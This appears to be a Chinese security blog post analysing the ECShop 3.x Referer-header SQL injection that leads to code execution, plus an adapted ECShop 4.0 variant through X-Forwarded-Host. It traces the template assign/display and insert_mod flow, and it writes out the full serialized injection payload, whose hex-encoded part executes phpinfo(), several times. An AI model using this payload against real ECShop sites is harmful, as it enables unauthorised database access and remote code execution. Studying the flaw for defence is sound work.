\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s?\_\_biz=MzIzMTQ4NzE2Ng==&mid=2247484556&idx=1&sn=d2d0ece33c7d22fce6f3d37fda214425&chksm=e8a2275ddfd5ae4b8da6c751b6f16a218fbbb13385d7d6be955797b7f772b694033f4231a276&xtrack=1&scene=90&subscene=93&sessionid=1599646882&clicktime=1599646966&enterid=1599646966&ascene=56&devicetype=android-28&version=27001238&nettype=cmnet&abtest\_cookie=AAACAA%3D%3D&lang=zh\_CN&exportkey=ASOf2n1bjee%2BYWPvi%2BQ9yI0%3D&pass\_ticket=LwARNd4f0cVjdS8nGO%2BEr6Z5aGMyo9HpkBGCHzBZaCGneobYcuSBJCyJlht406G6&wx\_header=1)

  

  

  

**点击蓝字 ·  关注我们**

  

**01**

  

背景

  

payload Referer 处 SQL 注入导致 RCE(先对公开的进行分析学习)

![](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgenxJSgtribic1DY09KnNwicefQKwpeFGuC4iaTF5QYgnibwzZREUsRCp744bic7BVozR7495hxhNiaMUqgog/640?wx_fmt=png)

**02**

  

为什么要在 HTTP 头 SQL 注入

  

require(dirname(\_\_FILE\_\_).'/includes/init.php'); // 核心文件

跟一下 addslashes\_deep 做了什么

![](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgenxJSgtribic1DY09KnNwicefQreujBXWhMib6fiaSADnprwXoZUSSLicmIibSyH1cicpacjBznu6sWVnSrsg/640?wx_fmt=png)

用户传参被转义，gbk 的话可以宽字节绕过，或者考虑二次注入，或者找数字型注入，无需闭合。

在 HTTP 头内的参数不会被转义。(优先考虑)

![](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgenxJSgtribic1DY09KnNwicefQ8JmG7WDia31qkCRvo8WCE9ZickrlUibgPfXGbOB3IvhUqpCUWl3icgRVKQ/640?wx_fmt=png)

**03**

  

ecshop3.6 payload 分析

  

user.php?act=login   Referer 为入口处。

**0x01**

*   45ea207d7a2b68c49582d2d22adf953aads 是什么?
    
*   a:2:{s:3:“num”;s:107:“\*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b706870696e666f0928293b2f2f7d787878,10-- -”;s:2:“id”;s:11:“-1‘ UNION/\*”;} // 为什么要序列化?
    

  

![](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgenxJSgtribic1DY09KnNwicefQCQxwemRJB3IBTkJyIRf1bbp51D6uHEYXxsMp311BDTRln6oUWtzWlA/640?wx_fmt=png)

**0x02**

*   HTTP\_REFERER 可控
    
*   assign 加载 ;display 展示模板文件 // 可控参数被带入 assign 函数
    

  

![](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgenxJSgtribic1DY09KnNwicefQ9aniaiakBSNz3ur0hmb2JibBfjTM4P0QLmaIGsqDwczFhUUcWpVqxjvsw/640?wx_fmt=png)

**0x03**

*    HTTP\_REFERER 伪造
    

![](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgenxJSgtribic1DY09KnNwicefQ2FG54vx6JlDPutpLiaibAHs1MPuHpnJ1pmlmSic0AOnvG7CUEkv39gENg/640?wx_fmt=png)

**0x04**

*   $back\_act 可控
    

![](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgenxJSgtribic1DY09KnNwicefQHjWlRmTmlHyKPfSUZsUrMQNVfLHf1tiayibXjTAL9FSia670RqwuR0o2w/640?wx_fmt=png)

**0x05**

*   $smarty= new cls\_template;
    

![](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgenxJSgtribic1DY09KnNwicefQYLliaO0F9s52n6LdjuVjqoEmhYJicyzG2IzxO3Zq72bgXYaS06SdEIiaw/640?wx_fmt=png)

**0x06**

*   assign
    

![](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgenxJSgtribic1DY09KnNwicefQdBZJQ6TdGRqr3tDz54tuxFdibN6hSSeo75ksNnIegUWic41Z1IXGfZicA/640?wx_fmt=png)

**0x07**

*   assign
    
*   back\_act  user\_passport.dwt 模板赋值
    

![](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgenxJSgtribic1DY09KnNwicefQrPKyF7AlAL5tevnc1iay7rUj8GSukt2CdTNbI6UGjfvpiafyrTMSA9XQ/640?wx_fmt=png)

**0x08**

*   display
    

![](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgenxJSgtribic1DY09KnNwicefQgRFO0CcX55ZoW02xZZsYrb6E8WQnBRyKPeP9ibGT4wxYxa09xanIITQ/640?wx_fmt=png)

**0x09**

*   Display
    
*   45ea207d7a2b68c49582d2d22adf953aads 是什么？
    
*   \_echash? 对结果通过 echash 进行分割处理
    

![](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgenxJSgtribic1DY09KnNwicefQbKLNL5qbmtm9tyeQxIiaFudrXlN2ueSG2Biaw1K8Wm7KjxbF1wHypiaqg/640?wx_fmt=png)

**0x10**

*   Display
    
*   45ea207d7a2b68c49582d2d22adf953aads 是什么？
    
*   \_echash 的值
    
*   与 payload 中 45ea207d7a2b68c49582d2d22adf953aads 对比  多了 ads
    

![](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgenxJSgtribic1DY09KnNwicefQrCSlZAhIbibVGVVviattfPezxIbib1rrzOia5lLLdw1PWlBjD6nLcyhBicQ/640?wx_fmt=png)

**0x11**

*   Display
    
*   Insert\_mod 
    
*   分割?(通过 | 进行了分割处理传参)
    

![](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgenxJSgtribic1DY09KnNwicefQpUeosia6Q49uNdJj5d81AmCicpJ3JVAdeibHfiaBg3OLnO4KEIDiae073lA/640?wx_fmt=png)

**0x12**

*   Display
    
*   Insert\_mod 
    
*   a:2:{s:3:“num”;s:107:“\*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b706870696e666f0928293b2f2f7d787878,10-- -”;s:2:“id”;s:11:“-1‘ UNION/\*”;} // 为什么要序列化?
    

  

![](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgenxJSgtribic1DY09KnNwicefQEjk1zqbVbs7nPqYJqwoUXzkwctup0xNUKHpPhlG5wGuQCEMicsgRoqw/640?wx_fmt=png)

**0x13**

*   SQL
    
    通过\_echash 进行分割，传参进入 insert\_mod
    
    ![](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgenxJSgtribic1DY09KnNwicefQluNzKUlq9ePlKtmTxK47Pibfeyoblw5gK381F4gXic2cGcrw81aoAtYg/640?wx_fmt=png)
    

**0x14**

*   SQL
    

通过\_echash 进行分割, 传参进入 insert\_mod, 打印 $k 会发现分割后, 剩下的 ads | 序列化后的数据, 进入 insert\_mod(key 值为 5, 满足 $key%2 ==1）

![](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgenxJSgtribic1DY09KnNwicefQzfm0xcChXGovniaU6VspdlYuKUfZiaE7d38ibcZPrDwvO8vvME1q8ulOQ/640?wx_fmt=png)

**0x15**

*   SQL
    

Insert\_mod 处理  

ads|a:2:{s:3:"num";s:107:"\*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b706870696e666f0928293b2f2f7d787878,10-- -";s:2:"id";s:11:"-1' UNION/\*";}

![](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgenxJSgtribic1DY09KnNwicefQH9ULhrZpYPooiab9xVshJLGVTrAmKq8oKmlpibO8Qs1ofWmLia65oeIHw/640?wx_fmt=png)

**0x16**

*   SQL
    

Insert\_mod 处理, 通过分割后，$fun 与多出的 ads 进行拼接，$para 是我们可控的序列化数据, 最后被带入 insert\_ads 造成 SQL 注入。

![](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgenxJSgtribic1DY09KnNwicefQRFGam1yA71ia5ZBvVHoNOIsqWbfdjQa44fMOb03icZTG307gV65enzYg/640?wx_fmt=png)

**0x17**

*   SQL 拼接导致的 SQL 注入
    

  

![](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgenxJSgtribic1DY09KnNwicefQfuaNKkrEYDRhYqtSbpycBzicibN8THzLlhuwn1bic1xic5ABrbH83JZAmA/640?wx_fmt=png)

**0x18**

*   HTTP 头传参 (防止被转义)
    
*   可控参数代入 assign 渲染模板
    
*   display 进行\_echash 进行分割, 带入 insert\_mod
    
*   一个可以利用的 inser\_xxx 函数 造成 SQL
    

**04**

  

Ecshop 4.0 SQL  葫芦画瓢  

  

**0x01**

*   新的 HTTP 头寻找
    

  

![](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgenxJSgtribic1DY09KnNwicefQkfVFFKdYUWDVU9VkjiafzvMxqqHueEPSP9Ftv4SLNFkzHzXXLHeCdww/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgenxJSgtribic1DY09KnNwicefQQYE4Cc3fuAGLgL9sPBQGaYHpu9K2qVcgcOia7EfKOw7uROKDhRXzgWw/640?wx_fmt=png)

**0x02**

*   Get\_domain 以 HTTP\_X\_FORWARDED\_HOST 获取返回 Function url() 函数调用了 get\_domain 函数。
    

![](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgenxJSgtribic1DY09KnNwicefQyJ8quoEOq1RvqPtTiaVAeiaVBxNNDkxDNfTVfqTicTYiahbj2CjJc2ctPQ/640?wx_fmt=png)

**0x03**

*   可控点有了, 找带入 assign 然后被 display 展示,
    

比如 user.php$action=collection\_list 时, 可控, 代入, 展示。

![](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgenxJSgtribic1DY09KnNwicefQxY5zBSM9el5g4zjn1sFjjuraLEnCLFqOAyKOp5UUy1pPjEo1lz5XLg/640?wx_fmt=png)

  

**0x04**

*   可以加载的 insert\_xxx
    

  

![](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgenxJSgtribic1DY09KnNwicefQ2ia6WDbgcp67sMYGDnia6DqGwU1g1ekx5Y2fLsmD9FNKDThbicrvSYErA/640?wx_fmt=png)

*   Insert\_user\_account   拼接注入 user\_id 等参数可控
    

![](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgenxJSgtribic1DY09KnNwicefQqYDccdTopm13ib7bAiafGGBPYr4Jknv7TEVLwUjoeR7TVA3CouRh9lZg/640?wx_fmt=png)

**05**

  

Payload 构造

  

**0x01**

*   $\_echash
    

![](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgenxJSgtribic1DY09KnNwicefQiak4NJ9icqxl0ZkvCCfKeNf2kENl0teXybHniblh9VhiaRVG7whwxASasQ/640?wx_fmt=png)

*   函数名 user\_account
    
*   SQLpayload 序列化后的数据
    

0x02  

*   SQLpayload
    

![](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgenxJSgtribic1DY09KnNwicefQPicSdsOxvFYuGp5NrynVxvGbV7rLRDicZehPKzhVq7xteSd1NicwozAbw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgenxJSgtribic1DY09KnNwicefQCUaOlYyrfK9hgy2wC3tyMgU1yCuT7hxj1dmdKIBPctSeDZEIJFd8Tw/640?wx_fmt=png)

**06**

  

总结

  

            Payload 在文中~, 更多干货、或者 0day 请关注我们, 持续 get 哦!      

           \[ 本文仅供学习参考, 请勿用于非法用途\]

  

  

  

EDI 安全  

![](https://mmbiz.qpic.cn/mmbiz_jpg/rJALXSMzgenxJSgtribic1DY09KnNwicefQzpO96WYP8V7AveObflibJYIDoUiaMtTGxZ62XXbfy8jybyvvQbNicbzLg/640?wx_fmt=jpeg)

**扫二维码｜关注我们**

  

一个专注渗透实战经验分享的公众号